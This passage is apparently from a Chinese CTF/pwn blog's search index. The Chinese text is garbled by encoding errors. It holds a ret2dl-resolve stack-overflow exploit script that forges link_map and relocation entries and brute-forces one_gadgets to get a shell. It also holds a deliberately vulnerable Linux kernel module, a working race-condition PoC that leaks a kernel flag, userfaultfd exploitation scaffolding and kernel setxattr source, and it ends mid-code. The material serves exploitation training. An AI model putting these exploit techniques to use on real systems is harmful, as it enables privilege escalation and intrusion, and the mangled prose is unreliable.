libc.sym['__libc_start_main']\n    fake_link_map=elf.got['__libc_start_main']    #change!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n    fake_st_value=one_gadget-libc_start_main_addr    #0x4526a   0xf02a4     0xf1147\n    fake_r_offset=libc_bss_addr-libc_start_main_addr\n    # fake_st_value=0x4526a-0x20740    #0x4526a   0xf02a4     0xf1147\n    # fake_r_offset=0x3c5720-0x20740\n\n    val_0x68=base_stage+0xc0-8    #0x600ea8\n    val_0x70=base_stage+0xc0-8    #0x600eb8\n    val_0xf8=base_stage+0xc0-8    #0x600f28\n    wait_time=0.1\n\n    #print p.recv()        # 'Welcome to XDCTF2015~!\\n'\n\n    #1.å¾€fake_link_map+0x68å†™å€¼\n    payload='\\x00'*offset_rbp\n    payload+='\\x00'*8\n    payload+=makecall(p6_addr,call_addr,read_got,0,fake_link_map+0x68,16,tail=vuln_addr)\n    payload=payload.ljust(0x100,'\\x00')\n    #gdb_a(0x4006AA)\n    p.send(payload)\n    #pause()\n    sleep(wait_time)\n    p.send(p64(val_0x68)+p64(val_0x70))\n\n    #2.å¾€fake_link_map+0xf8å†™å€¼\n    payload='\\x00'*offset_rbp\n    payload+='\\x00'*8\n    payload+=makecall(p6_addr,call_addr,read_got,0,fake_link_map+0xf8,8,tail=vuln_addr)\n    payload=payload.ljust(0x100,'\\x00')\n    p.send(payload)\n    sleep(wait_time)\n    p.send(p64(val_0xf8))\n\n    #3.å¾€base_stageå†™å…¥ä¼ªé€ ç»“æ„å¹¶è·³è¿‡å»\n    payload='\\x00'*offset_rbp\n    payload+='\\x00'*8\n    payload+=makecall(p6_addr,call_addr,read_got,0,base_stage,0xd0,tail=0)   #å‡è®¾ç»“æ„å¤§å°æ˜¯400\n    payload+=p64(0)*2+p64(base_stage)+p64(0)*4\n    payload+=p64(leave_ret)\n    payload=payload.ljust(0x100,'\\x00')\n    p.send(payload)\n\n\n    #4.bssæ•°æ®ï¼šrop-å‚æ•°æ”¾åœ¨å¯„å­˜å™¨/ ä¼ªé€ ç»“æ„  \n    #(1)ç¡®å®šå„ä¸ªèŠ‚çš„åœ°å€ \n    plt_1 = plt_0+6\n    #(2)ç¡®å®šé‡å®šä½ä¸‹æ ‡\n    align = 24 - (56 % 24)  # è¿™é‡Œçš„å¯¹é½æ“ä½œæ˜¯å› ä¸ºdynsymé‡Œçš„ELF64_R_SYMç»“æ„ä½“éƒ½æ˜¯24å­—èŠ‚å¤§å°\n    index_offset = base_stage + 7*8 + align\n    index = (7*8 + align) / 24 # base_stage + 7*8 æŒ‡å‘fake_relocï¼Œå‡å»rel_pltå³åç§»\n    #(3)ç¡®å®šåŠ¨æ€é“¾æ¥ç¬¦å·ä¸‹æ ‡\n    align = 24 - ((13*8) % 24)# è¿™é‡Œçš„å¯¹é½æ“ä½œæ˜¯å› ä¸ºdynsymé‡Œçš„Elf64_Symç»“æ„ä½“éƒ½æ˜¯24å­—èŠ‚å¤§å°\n    fake_sym_addr = base_stage + 13*8 + align\n    index_dynsym = (13*8 + align) / 24 # é™¤ä»¥24å› ä¸ºElf64_Symç»“æ„ä½“çš„å¤§å°ä¸º24ï¼Œå¾—åˆ°writeçš„dynsymç´¢å¼•å·\n    #(4)ä¼ªé€ é‡å®šä½ç»“æ„+åŠ¨æ€é“¾æ¥ç»“æ„\n    r_info = (index_dynsym << 32) | 0x7\n    fake_reloc = p64(fake_r_offset) + p64(r_info) + p64(0)\n    fake_sym = p32(0) + p32(0x112) + p64(fake_st_value) + p64(0)\n\n    payload2 = p64(0)#'AAAAAAAA'\n    payload2 += p64(p_rdi_ret)\n    payload2 += p64(base_stage+0xc0)   #/bin/sh\n    payload2 += p64(plt_1)\n    payload2 += p64(fake_link_map)   #\n    payload2 += p64(index)       #jmprel ä¸‹æ ‡å‚æ•°\n    payload2 += p64(0)       #è¿”å›åœ°å€\n\n    payload2 = payload2.ljust(index_offset-base_stage,'\\x00')\n    payload2 += fake_reloc # index_offset(base_stage+7*8)çš„ä½ç½®\n    payload2 = payload2.ljust(fake_sym_addr-base_stage,'\\x00')\n    payload2 += fake_sym   # fake_sym_addr(base_stage+9*8)çš„ä½ç½®\n    payload2 = payload2.ljust(0xc0,'\\x00')\n    payload2 += p64(base_stage)\n    payload2 = payload2.ljust(0xd0,'\\x00')\n\n    p.send(payload2)\n    sleep(wait_time)\n\n    #----getshell-----\n    #no interactive\n    p.recv(timeout=0.5)\n    try:\n        p.sendline(b'cat flag')\n        flag = p.recvuntil(b'}')\n    except:\n        p.close()\n        #continue\n    if b'}' in flag:\n        log.success('flag: %s', regexp_out(flag))\n        exit()\n\n\n\ni = 0\nwhile True:\n    global p\n    i += 1\n    log.info(\"Times:%d\"%i)\n    for libcFile in libc_list:\n        libcFile = libcAll_path + libcFile\n        one_gadget_list = myTool.getOnegadget(libcFile)\n        for one_gadget in one_gadget_list:\n            try:\n                p = process(fpath)\n                log.success('libcFile: %s',libcFile)\n                #print(one_gadget)\n                pwn(libcFile,one_gadget)\n                #pwn()\n            except EOFError:\n                p.close()\n                continue\n            except Exception:\n                p.close()\n                continue\n            else:\n                p.interactive()\n                break\n```\n\n\n\n#### â‘£å¼€äº†æ²™ç®±ï¼Œåªæœ‰readå’Œlibcæ–‡ä»¶\n\nè¿™ç§å°±å¾—ç”¨orwæ¥è¯»å–flagäº†æˆ–è€…ä½¿ç”¨æµ‹ä¿¡é“æ”»å‡»ï¼Œä¹‹åå†æ¥è¯¦ç»†å®Œæˆä¸€ä¸‹æŠŠã€‚\n\n[æ ˆæº¢å‡º(64bit)çš„ä¸€äº›æ“ä½œ<äºŒ> (zoepla.github.io)](https://zoepla.github.io/2018/08/æ ˆæº¢å‡º_äºŒ_-64ä½/)\n\n\n\n\n\n\n\n\n\n\n\nğŸ”ºæœ‰æ—¶å€™ä¸‡èƒ½gadgetå¯èƒ½ä¸å¤ªä¸€æ ·\n\n![image-20211214220500845](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211214220500.png)\n\nrdiå’Œrdxçš„èµ‹å€¼é¡ºåºå¯èƒ½å‘ç”Ÿå˜åŒ–ï¼Œéœ€è¦æ³¨æ„\n","tags":["æ ˆæº¢å‡º"],"categories":["PWN","æ ˆæº¢å‡º"]},{"title":"pwnKernelä»0å¼€å§‹(å››)","url":"/2021/10/19/Kernelä»0å¼€å§‹(å››)/","content":"\n\n\n# å‰è¨€\n\nè¿™é‡Œå°è¯•å„ç§å„æ ·çš„éªšæ“ä½œè§£æ³•\n\n# ä¸€ã€å¤šçº¿ç¨‹çš„çœŸæ¡ä»¶ç«äº‰\n\n## 1.ç®€å•çš„å¤šçº¿ç¨‹\n\nå…ˆç»™å‡ºè‡ªå·±ç¼–å†™çš„é¢˜ç›®æºç ï¼Œå‚ç…§å¤šæ–¹é¢˜ç›®ï¼Œä¸»è¦è¿˜æ˜¯0CTF2018-baby\n\n```c\n#include <linux/module.h>\n#include <linux/version.h>\n#include <linux/kernel.h>\n#include <linux/types.h>\n#include <linux/kdev_t.h>\n#include <linux/fs.h>\n#include <linux/device.h>\n#include <linux/cdev.h>\n#include <asm/uaccess.h>\n#include <linux/slab.h>\n\n//è®¾å¤‡é©±åŠ¨å¸¸ç”¨å˜é‡\n//static char *buffer_var = NULL;\nstatic char *buffer_var = NULL;\nstatic struct class *devClass; // Global variable for the device class\nstatic struct cdev cdev;\nstatic dev_t condition_dev_no;\n\n\nstruct flagStruct\n{\n    int len;\n    char* flagUser;\n};\n\n\n\nstatic struct flagStruct* flagObj;\nstatic char* flag = \"flag{PIG007NBHH}\";\n\nstatic long condition_ioctl(struct file *filp, unsigned int cmd, unsigned long arg);\n\nstatic int condition_open(struct inode *i, struct file *f);\n\nstatic int condition_close(struct inode *i, struct file *f);\n\nstatic bool chk_range_not_ok(ssize_t v1,ssize_t v2);\n\n\nstatic struct file_operations condition_fops =\n        {\n                .owner = THIS_MODULE,\n                .open = condition_open,\n                .release = condition_close,\n                .unlocked_ioctl = condition_ioctl\n        };\n\n// è®¾å¤‡é©±åŠ¨æ¨¡å—åŠ è½½å‡½æ•°\nstatic int __init condition_init(void)\n{\n    printk(KERN_INFO \"[i] Module condition registered\");\n    if (alloc_chrdev_region(&condition_dev_no, 0, 1, \"condition\") < 0)\n    {\n        return -1;\n    }\n    if ((devClass = class_create(THIS_MODULE, \"chardrv\")) == NULL)\n    {\n        unregister_chrdev_region(condition_dev_no, 1);\n        return -1;\n    }\n    if (device_create(devClass, NULL, condition_dev_no, NULL, \"condition\") == NULL)\n    {\n        printk(KERN_INFO \"[i] Module condition error\");\n        class_destroy(devClass);\n        unregister_chrdev_region(condition_dev_no, 1);\n        return -1;\n    }\n    cdev_init(&cdev, &condition_fops);\n    if (cdev_add(&cdev, condition_dev_no, 1) == -1)\n    {\n        device_destroy(devClass, condition_dev_no);\n        class_destroy(devClass);\n        unregister_chrdev_region(condition_dev_no, 1);\n        return -1;\n    }\n\n    printk(KERN_INFO \"[i] <Major, Minor>: <%d, %d>\\n\", MAJOR(condition_dev_no), MINOR(condition_dev_no));\n    return 0;\n\n}\n\n// è®¾å¤‡é©±åŠ¨æ¨¡å—å¸è½½å‡½æ•°\nstatic void __exit condition_exit(void)\n{\n    // é‡Šæ”¾å ç”¨çš„è®¾å¤‡å·\n    unregister_chrdev_region(condition_dev_no, 1);\n    cdev_del(&cdev);\n}\n\n\n\n\n// ioctlå‡½æ•°å‘½ä»¤æ§åˆ¶\nlong condition_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)\n{\n    int retval = 0;\n    printk(KERN_INFO \"Ioctl Get!\\n\");\n    switch (cmd) {\n        case 111: //doubleCon  //get flag_addr\n            printk(\"Your flag is at %llx! But I don't think you know it's content\\n\",flag);\n            break;\n\n        case 222: //doubleCon  //print flag\n            flagObj =  (struct flagStruct*)arg;\n            ssize_t userFlagAddr = flagObj->flagUser;\n            ssize_t userFlagObjAddr = (ssize_t)flagObj;\n    \n            if(chk_range_not_ok(userFlagAddr,flagObj->len)\n                &&chk_range_not_ok(userFlagObjAddr,0)\n                &&(flagObj->len == strlen(flag)))\n    \n            {\n                if(!strncmp(flagObj->flagUser,flag,strlen(flag)))\n                    printk(\"Looks like the flag is not a secret anymore. So here is it %s\\n\", flag);\n                else\n                    printk(\"Wrong!\");\n                break;\n            }\n            else\n            {\n                printk(\"Wrong!\\n\");\n                break;\n            }\n        default:\n            retval = -1;\n            break;\n    }    \n    \n    return retval;\n\n}\n\n\nstatic bool chk_range_not_ok(ssize_t v1,ssize_t v2)\n{\n    if((v1 + v2) <= 0x7ffffffff000)\n        return true;\n    else\n        return false;\n}\n\nstatic int condition_open(struct inode *i, struct file *f)\n{\n    printk(KERN_INFO \"[i] Module condition: open()\\n\");\n    return 0;\n}\n\nstatic int condition_close(struct inode *i, struct file *f)\n{\n    kfree(buffer_var);\n    //buffer_var = NULL;\n    printk(KERN_INFO \"[i] Module condition: close()\\n\");\n    return 0;\n}\n\nmodule_init(condition_init);\nmodule_exit(condition_exit);\n\nMODULE_LICENSE(\"GPL\");\n// MODULE_AUTHOR(\"blackndoor\");\n// MODULE_DESCRIPTION(\"Module vuln overflow\");\n```\n\n### (1)å‰ç½®çŸ¥è¯†\n\nä¸»è¦æ˜¯çº¿ç¨‹çš„çŸ¥è¯†ã€‚\n\nå°±æ˜¯å¦‚æœä¸€ä¸ªå˜é‡æ˜¯å…¨å±€çš„ï¼Œé‚£ä¹ˆåœ¨æ²¡æœ‰é”çš„æƒ…å†µå°±ä¼šå¯¼è‡´ä¸€ä¸ªç¨‹åºçš„ä¸åŒçº¿ç¨‹å¯¹è¯¥å…¨å±€å˜é‡è¿›è¡Œçš„ç«äº‰è¯»å†™æ“ä½œã€‚å°±åƒè¿™é‡Œç»™å‡ºçš„ä»£ç ï¼Œé¦–å…ˆflagåœ¨å†…æ ¸æ¨¡å—ä¸­æ˜¯é™æ€å…¨å±€çš„ï¼š\n\n```c\nstatic char* flag = \"flag{PIG007NBHH}\";\n//--------------------------------------------------\nif(chk_range_not_ok(userFlagAddr,flagObj->len)\n   &&chk_range_not_ok(userFlagObjAddr,0)\n   &&(flagObj->len == strlen(flag)))\n\n{\n    if(!strncmp(flagObj->flagUser,flag,strlen(flag)))\n        printk(\"Looks like the flag is not a secret anymore. So here is it %s\\n\", flag);\n    else\n        printk(\"Wrong!\");\n    break;\n}\nelse\n{\n    printk(\"Wrong!\\n\");\n    break;\n}\n```\n\n\n\n### (2)æ£€æµ‹ï¼š\n\nå…ˆæ£€æµ‹ä¼ å…¥çš„æ•°æ®çš„åœ°å€æ˜¯å¦æ˜¯åœ¨ç”¨æˆ·ç©ºé—´ï¼Œé•¿åº¦æ˜¯å¦ä¸ºflagçš„é•¿åº¦ï¼Œä¼ å…¥çš„æ‰€æœ‰æ•°æ®æ˜¯å¦å¤„åœ¨ç”¨æˆ·ç©ºé—´ã€‚å¦‚æœéƒ½æ˜¯ï¼Œå†åˆ¤æ–­ä¼ å…¥çš„æ•°æ®ä¸flagæ˜¯å¦ä¸€è‡´ï¼Œä¸€è‡´åˆ™æ‰“å°flagï¼Œå¦åˆ™æ‰“å°Wrongç„¶åé€€å‡ºã€‚\n\nè¿™ä¹ˆä¸€çœ‹å¥½åƒæ— æ³•å¾—åˆ°flagï¼Œé¦–å…ˆflagæˆ‘ä»¬ä¸çŸ¥é“ï¼Œæ˜¯ç¡¬ç¼–ç åœ¨å†…æ ¸æ¨¡å—ä¸­çš„ã€‚å…¶æ¬¡å°±ç®—æ— æ³•ä¼ å…¥å†…æ ¸æ¨¡å—ä¸­çš„åœ°å€ï¼Œæ„å‘³ç€å°±ç®—æˆ‘ä»¬è·å¾—äº†å†…æ ¸æ¨¡å—ä¸­flagçš„åœ°å€å’Œé•¿åº¦ï¼Œä¼ è¿›å»ä¹Ÿä¼šåˆ¤å®šå¤±è´¥ã€‚\n\n### (3)æ¼æ´\n\nä½†æ˜¯è¿™æ˜¯å»ºç«‹åœ¨ä¸€ä¸ªçº¿ç¨‹ä¸­çš„ï¼Œå¦‚æœæ˜¯å¤šä¸ªçº¿ç¨‹å‘¢ã€‚åœ¨æˆ‘ä»¬ä¼ å…¥ç”¨æˆ·ç©ºé—´çš„æŸä¸ªæ•°æ®åœ°å€å’Œé•¿åº¦ä¹‹åï¼Œå…ˆè¿›å…¥ç¨‹åºçš„ifè¯­å¥ï¼Œä¹Ÿå°±æ˜¯è¿›å…¥å¦‚ä¸‹ifè¯­å¥\n\n```c\nif(chk_range_not_ok(userFlagAddr,flagObj->len)\n   &&chk_range_not_ok(userFlagObjAddr,0)\n   &&(flagObj->len == strlen(flag)))\n```\n\nç„¶ååœ¨æ£€æµ‹flagæ•°æ®ä¹‹å‰ï¼Œä¹Ÿå°±æ˜¯å¦‚ä¸‹ifè¯­å¥ä¹‹å‰ï¼Œå¯åŠ¨å¦å¤–ä¸€ä¸ªçº¿ç¨‹æŠŠä¼ å…¥çš„è¯¥æ•°æ®åœ°å€ç»™æ”¹æˆå†…æ ¸æ¨¡å—çš„flagçš„æ•°æ®åœ°å€ï¼Œè¿™æ ·å°±èƒ½æˆåŠŸæ‰“å°flagäº†ã€‚\n\n```c\nif(!strncmp(flagObj->flagUser,flag,strlen(flag)))\n```\n\né‚£ä¹ˆå°±ç›´æ¥ç»™å‡ºPOCï¼Œè¿™é‡Œæ¶‰åŠåˆ°ä¸€äº›çº¿ç¨‹çš„æ“ä½œï¼Œå¯ä»¥è‡ªå·±å­¦ä¹ ä¸€ä¸‹ã€‚\n\n\n\n### (4)POC\n\n```C\n// gcc -static exp.c -lpthread -o exp\n#include <string.h>\n//char *strstr(const char *haystack, const char *needle);\n//#define _GNU_SOURCE         /* See feature_test_macros(7) */\n//char *strcasestr(const char *haystack, const char *needle);\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <sys/ioctl.h>\n#include <fcntl.h>\n#include <pthread.h>\n#include <errno.h>\n#include <sys/mman.h>\n#include <assert.h>\n\n#define TRYTIME 0x1000\n\n\nstruct flagStruct\n{\n    int len;\n    char* flagUseAddr;\n};\nstruct flagStruct flagChunk;\n\n\n//open dev\nint openDev(char* pos);\n\n\nchar readFlagBuf[0x1000+1]={0};\nint finish =0;\nunsigned long long flagKerneladdr;\nvoid changeFlagAddr(void* arg);\n\nint main(int argc, char *argv[])\n{\n    setvbuf(stdin,0,2,0);\n    setvbuf(stdout,0,2,0);\n    setvbuf(stderr,0,2,0); \n\n    int devFD;\n    int addrFD;\n    unsigned long memOffset;\n    pthread_t thread;\n\n    //open Dev\n    char* pos = \"/dev/condition\";\n    devFD = openDev(pos);\n\n    char flagBuf[16] = {0};\n    flagReadFun(devFD,16,flagBuf);\n\n\n    system(\"dmesg > /tmp/record.txt\");\n    addrFD = open(\"/tmp/record.txt\",O_RDONLY);\n    lseek(addrFD,-0x1000,SEEK_END);\n    read(addrFD,readFlagBuf,0x1000);\n    close(addrFD);\n    int flagIdxInBuf;\n    flagIdxInBuf = strstr(readFlagBuf,\"Your flag is at \");\n    if (flagIdxInBuf == 0){\n        printf(\"[-]Not found addr\");\n        exit(-1);\n    }\n    else{\n        flagIdxInBuf+=16;\n        flagKerneladdr = strtoull(flagIdxInBuf,flagIdxInBuf+16,16);\n        printf(\"[+]flag addr: %p\\n\",flagKerneladdr);\n    }\n\n    pthread_create(&thread, NULL, changeFlagAddr,&flagChunk);\n    for(int i=0;i<TRYTIME;i++){\n        flagJudgeFun(devFD,16,&flagBuf);\n    }\n    finish = 1;\n    pthread_join(thread, NULL);\n\n    close(devFD);\n    puts(\"[+]result is :\");\n    system(\"dmesg | grep flag\");\n    return 0;\n}\n\n\nint openDev(char* pos){\n    int devFD;\n    printf(\"[+] Open %s...\\n\",pos);\n    if ((devFD = open(pos, O_RDWR)) < 0) {\n        printf(\"    Can't open device file: %s\\n\",pos);\n        exit(1);\n    }\n    return devFD;\n}\n\nvoid flagReadFun(int devFD,int len,char *buf)\n{\n    flagChunk.len = len;\n    flagChunk.flagUseAddr = buf;\n    ioctl(devFD,111,&flagChunk);\n}\n\n\nvoid flagJudgeFun(int devFD,int len,char *buf)\n{\n    flagChunk.len = len;\n    flagChunk.flagUseAddr = buf;\n    ioctl(devFD,222,&flagChunk);\n}\n\nvoid changeFlagAddr(void* arg){\n    struct flagStruct * flagPTChunk = arg;\n    while(finish==0){\n        //s1->flagUseAddr = flagKerneladdr;\n        flagPTChunk->flagUseAddr = flagKerneladdr;\n    }\n}\n\n```\n\næœ€åå¦‚ä¸‹æ•ˆæœï¼š\n\n![image-20211019152909777](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211019152917.png)\n\néœ€è¦æ³¨æ„çš„æ˜¯åœ¨gccç¼–è¯‘çš„æ—¶å€™éœ€è¦åŠ ä¸Š`-lpthread`å¤šçº¿ç¨‹çš„å‚æ•°ã€‚è¿˜æœ‰çº¿ç¨‹çš„å›è°ƒå‡½æ•°å¿…é¡»ä¼ å…¥è‡³å°‘ä¸€ä¸ªå‚æ•°ï¼Œä¸ç®¡è¯¥å‚æ•°åœ¨é‡Œé¢æœ‰æ²¡æœ‰è¢«ç”¨åˆ°ã€‚\n\n\n\n## 2.UserFaultFD\n\nå…³äºè¿™ä¸ªå®åœ¨æ˜¯æœ‰ç‚¹å¤šï¼Œæ¶‰åŠçš„çŸ¥è¯†ä¹Ÿæœ‰ç‚¹å¤šï¼Œå…·ä½“çš„å¯ä»¥çœ‹ï¼Œç‰ˆæœ¬åœ¨v4.3åŠä»¥ä¸Šæ‰å¯ç”¨\n\n[Linux Kernel Userfaultfd å†…éƒ¨æœºåˆ¶æ¢ç©¶ - BrieflyX's Base](http://brieflyx.me/2020/linux-tools/userfaultfd-internals/)\n\n[ä»å¼ºç½‘æ¯ 2021 çº¿ä¸Šèµ›é¢˜ç›® notebook ä¸­æµ…æ userfaultfd åœ¨ kernel pwn ä¸­çš„åˆ©ç”¨ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)](https://www.anquanke.com/post/id/253835#h3-5)\n\nä¸»è¦å°±æ˜¯ä½¿ç”¨æ–¹æ³•ï¼Œä»¥åŠæ˜¯å¦å¯ç”¨\n\n### (1)æ˜¯å¦å¯ç”¨\n\n#### â‘ ç¼–è¯‘æ—¶\n\nåœ¨æˆ‘ä»¬ç¼–è¯‘å†…æ ¸çš„æ—¶å€™ï¼Œéœ€è¦åŠ å…¥å¦‚ä¸‹çš„é€‰é¡¹åœ¨.configä¸­\n\n```\nCONFIG_USERFAULTFD=y\n```\n\nä¸ç„¶å½“æˆ‘ä»¬å°è¯•ä½¿ç”¨å¦‚ä¸‹ä»£ç æ³¨å†Œæ—¶ï¼Œå°±ä¼šè¿”å›-1ï¼Œè¡¨ç¤ºå¤±è´¥\n\n```\nuffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);\n```\n\n#### â‘¡ç‰ˆæœ¬é™åˆ¶\n\nåœ¨v5.11åŠä»¥ä¸Šçš„ç‰ˆæœ¬ä¸­åŠ å…¥äº†å¦‚ä¸‹é™åˆ¶\n\n```c\n//fs/userfaultfd.c\nif (!sysctl_unprivileged_userfaultfd &&\n    (flags & UFFD_USER_MODE_ONLY) == 0 &&\n    !capable(CAP_SYS_PTRACE)) {\n    printk_once(KERN_WARNING \"uffd: Set unprivileged_userfaultfd \"\n                \"sysctl knob to 1 if kernel faults must be handled \"\n                \"without obtaining CAP_SYS_PTRACE capability\\n\");\n    return -EPERM;\n}\n```\n\nä¹Ÿå°±æ˜¯è¯´ï¼Œå¿…é¡»è¦æ˜¯rootæƒé™æ‰å¯ä»¥ä½¿ç”¨è¯¥æœºåˆ¶\n\n### (2)ä½¿ç”¨æ–¹æ³•\n\næ¢ç©¶å®Œäº†æ˜¯å¦å¯ç”¨ï¼Œå†æ¥çœ‹çœ‹ä½¿ç”¨æ–¹æ³•ï¼ŒåŒæ ·åœ¨ä¸Šé¢ç»™å‡ºçš„é“¾æ¥ä¸­æœ‰ä¸€ä¸ªæ¿å­ï¼Œå°è¯•æ‹¿æ¥ç”¨ä¸€ä¸‹\n\n```c\n#include <sys/types.h>\n#include <sys/xattr.h>\n#include <stdio.h>\n#include <linux/userfaultfd.h>\n#include <pthread.h>\n#include <errno.h>\n#include <unistd.h>\n#include <stdlib.h>\n#include <fcntl.h>\n#include <signal.h>\n#include <poll.h>\n#include <string.h>\n#include <sys/mman.h>\n#include <sys/syscall.h>\n#include <sys/ioctl.h>\n#include <sys/sem.h>\n#include <sys/ipc.h>\n#include <sys/shm.h>\n#include <semaphore.h>\n\nstatic char     *page = NULL;\nstatic size_t   page_size;\nstatic pthread_t monitor_thread;\n\nvoid registerUserFaultFd(void * addr, unsigned long len, void (*handler)(void*));\nvoid errExit(char *msg);\nstatic void * test_thread(void *arg);\n\n\nint main(int argc, char *argv[])\n{\n    char *uffd_buf_leak;\n    page = malloc(0x1000);\n    for(int i = 0 ; i < 0x20 ; i ++)\n    {\n        page[i] == \"\\x62\";\n    }\n    page_size = sysconf(_SC_PAGE_SIZE);\n\n    //ç”³è¯·ä¸€å—ä¿æŠ¤å†…å­˜ï¼Œæˆ‘ä»¬å¯¹è¯¥å†…å­˜è¿›è¡Œè¯»å†™æ“ä½œå°±ä¼šè¢«userfaultfdç»™æ•è·ï¼Œä»è€Œè¿›å…¥åˆ°test_threadå‡½æ•°ä¸­\n    uffd_buf = (char*) mmap(NULL, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n    registerUserFaultFd(uffd_buf, page_size, test_thread);\n    printf(\"\\033[1;31;40m[Test:]%016llx\\033[0m\\n\",*uffd_buf);\n}\n\n\nstatic void * test_thread(void *arg)\n{\n    struct uffd_msg msg;\n    int fault_cnt = 0;\n    long uffd;\n\n    struct uffdio_copy uffdio_copy;\n    ssize_t nread;\n\n    uffd = (long) arg;\n\n\n    for (;;)\n    {\n        struct pollfd pollfd;\n        int nready;\n        pollfd.fd = uffd;\n        pollfd.events = POLLIN;\n        nready = poll(&pollfd, 1, -1);\n\n\n\n        //è‡ªå®šä¹‰ä»£ç åŒºåŸŸ----------------------\n        printf(\"\\033[1;31;40m[Loading handler userfaultfd]%016llx\\033[0m\\n\");\n        //-------------------------------------\n\n\n\n        //åˆ¤æ–­æ˜¯å¦æ­£ç¡®æ‰“å¼€\n        if (nready == -1)\n            errExit(\"poll\");\n        nread = read(uffd, &msg, sizeof(msg));\n        if (nread == 0)\n            errExit(\"EOF on userfaultfd!\\n\");\n        if (nread == -1)\n            errExit(\"read\");\n        if (msg.event != UFFD_EVENT_PAGEFAULT)\n            errExit(\"Unexpected event on userfaultfd\\n\");\n\n\n\n        //æ•°æ®æ‹·è´åŒºåŸŸ\n        uffdio_copy.src = (unsigned long) page;\n        uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address &\n                          ~(page_size - 1);\n        uffdio_copy.len = page_size;\n        uffdio_copy.mode = 0;\n        uffdio_copy.copy = 0;\n        if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)\n            errExit(\"ioctl-UFFDIO_COPY\");\n        return NULL;\n    }\n}\n\nvoid registerUserFaultFd(void * addr, unsigned long len, void (*handler)(void*))\n{\n    long uffd;\n    struct uffdio_api uffdio_api;\n    struct uffdio_register uffdio_register;\n    int s;\n\n/* Create and enable userfaultfd object */\n    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);\n    if (uffd == -1)\n        errExit(\"userfaultfd\");\n\n    uffdio_api.api = UFFD_API;\n    uffdio_api.features = 0;\n    if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)\n        errExit(\"ioctl-UFFDIO_API\");\n\n    uffdio_register.range.start = (unsigned long) addr;\n    uffdio_register.range.len = len;\n    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;\n    if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)\n        errExit(\"ioctl-UFFDIO_REGISTER\");\n\n    s = pthread_create(&monitor_thread, NULL, handler, (void *) uffd);\n    if (s != 0)\n        errExit(\"pthread_create\");\n}\n\nvoid errExit(char *msg)\n{\n    printf(\"\\033[31m\\033[1m[x] Error at: \\033[0m%s\\n\", msg);\n    exit(EXIT_FAILURE);\n}\n```\n\nå¦‚ä¸‹æ•ˆæœï¼š\n\n![](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203081748375.png)\n\nå¯ä»¥çœ‹åˆ°åœ¨è¯•å›¾æ‰“å°è¢«æˆ‘ä»¬ç”³è¯·è¯»å†™ä¿æŠ¤çš„åŒºåŸŸæ—¶ï¼Œä¼šè°ƒç”¨åˆ°æˆ‘ä»¬çš„`test_thread`å‡½æ•°ä¸­\n\n### (3)é…åˆçŸ¥è¯†ç‚¹\n\né€šå¸¸æ„ä¹‰ä¸Šæ¥è®²ï¼ŒUserFaultFDæ˜¯ç”¨åœ¨å¤šçº¿ç¨‹ä¸‹ï¼Œç”¨æ¥åˆ¶é€ double-freeæˆ–è€…UAFçš„ã€‚è€Œåœ¨æ¯”è¾ƒä¸¥è‹›çš„æ¡ä»¶ä¸‹ï¼Œæ¯”å¦‚ï¼Œæ²¡æ³•å†™ï¼Œæˆ–è€…æ²¡åŠæ³•è¯»çš„æ—¶å€™ï¼Œå°±éœ€è¦é…åˆä»¥ä¸‹çš„ä¸¤ä¸ªçŸ¥è¯†ç‚¹ã€‚\n\n#### setxattr\n\nè°ƒç”¨é“¾ä¸º\n\n```\nSYS_setxattr()->path_setxattr()->setxattr()\n```\n\nä»£ç å¦‚ä¸‹\n\n```c\n//fs/xattr.c\nstatic long\nsetxattr(struct user_namespace *mnt_userns, struct dentry *d,\n\t const char __user *name, const void __user *value, size_t size,\n\t int flags)\n{\n\tint error;\n\tvoid *kvalue = NULL;\n\tchar kname[XATTR_NAME_MAX + 1];\n\n\tif (flags & ~(XATTR_CREATE|XATTR_REPLACE))\n\t\treturn -EINVAL;\n\n\terror = strncpy_from_user(kname, name, sizeof(kname));\n\tif (error == 0 || error == sizeof(kname))\n\t\terror = -ERANGE;\n\tif (error < 0)\n\t\treturn error;\n\n\tif (size) {\n\t\tif (size > XATTR_SIZE_MAX)\n\t\t\treturn -E2BIG;\n        //ç”³è¯·chunkï¼ŒåŸºæœ¬ç›¸å½“äºkmallocå‡½æ•°ï¼Œsizeå¯æ§\n\t\tkvalue = kvmalloc(size, GFP_KERNEL);\n\t\tif (!kvalue)\n\t\t\treturn -ENOMEM;\n        //ä»valueæ‹·è´å†…å®¹åˆ°kvalueï¼Œvalueå¯æ§\n\t\tif (copy_from_user(kvalue, value, size)) {\n\t\t\terror = -EFAULT;\n\t\t\tgoto out;\n\t\t}\n\t\tif ((strcmp(kname, XATTR_NAME_POSIX_ACL_ACCESS) == 0) ||\n\t\t    (strcmp(kname, XATTR_NAME_POSIX_ACL_DEFAULT) == 0))\n\t\t\tposix_acl_fix_xattr_from_user(mnt_userns, kvalue, size);\n\t}\n\n\terror = vfs_setxattr(mnt_userns, d, kname, kvalue, size, flags);\nout:\n    //é‡Šæ”¾chunkï¼ŒåŸºæœ¬ç­‰äºkfreeå‡½æ•°\n\tkvfree(kvalue);\n\n\treturn 